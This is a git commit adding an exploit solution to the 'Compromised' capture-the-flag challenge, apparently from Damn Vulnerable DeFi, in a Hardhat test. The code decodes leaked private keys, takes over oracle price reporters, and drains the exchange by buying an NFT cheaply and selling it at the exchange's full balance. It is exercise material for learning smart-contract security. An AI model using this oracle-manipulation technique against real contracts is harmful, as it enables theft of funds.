1114affc4b729f482d19adc1e1c941431dc9a862
y1cunhui <yangruiguo@pku.edu.cn>
2022-07-15 22:30:49 +0800

    finish compromised

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -1,4 +1,5 @@
 const { expect } = require('chai');
+const { concat } = require('ethers/lib/utils');
 const { ethers } = require('hardhat');
 
 describe('Compromised challenge', function () {
@@ -61,6 +62,52 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        let leak1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
+        let leak2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";
+        
+        let decode = (s) =>   Buffer.from(s.split(" ").join(""), "hex").toString();
+        // console.log(decode(leak1));
+        // console.log(decode(leak2));
+         
+        let solve = (s) => Buffer.from(decode(s), 'base64').toString()
+        // console.log(solve(leak1));
+        // console.log(solve(leak2));
+        wallet1 = new ethers.Wallet(solve(leak1), attacker.provider);
+        wallet2 = new ethers.Wallet(solve(leak2), attacker.provider);
+        // console.log(wallet1);
+        // console.log(wallet2);
+
+        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther("0.01"));
+        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther("0.01"));
+
+        expect(await this.oracle.getMedianPrice("DVNFT")).to.eq(ethers.utils.parseEther("0.01"));
+
+        let tx = await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther("0.01")});
+        // cannot get the return value of state-change function directly
+        // get `tokenId` from events
+        // also not able to catch the event by contract.on (don't know why)
+        // so just use the receipt
+        const receipt = await tx.wait();
+        let tokenId;
+        for (const event of receipt.events) {
+            if (event.event == "TokenBought") {
+                // console.log(event.args);
+                tokenId = event.args["tokenId"].toNumber();
+            }
+        }
+        
+        
+        
+        expect(await this.nftToken.balanceOf(attacker.address)).to.eq("1");
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+
+        await this.oracle.connect(wallet1).postPrice("DVNFT", await ethers.provider.getBalance(this.exchange.address));
+        await this.oracle.connect(wallet2).postPrice("DVNFT", await ethers.provider.getBalance(this.exchange.address));
+
+        await this.exchange.connect(attacker).sellOne(tokenId);
+
+        await this.oracle.connect(wallet1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(wallet2).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
     after(async function () {
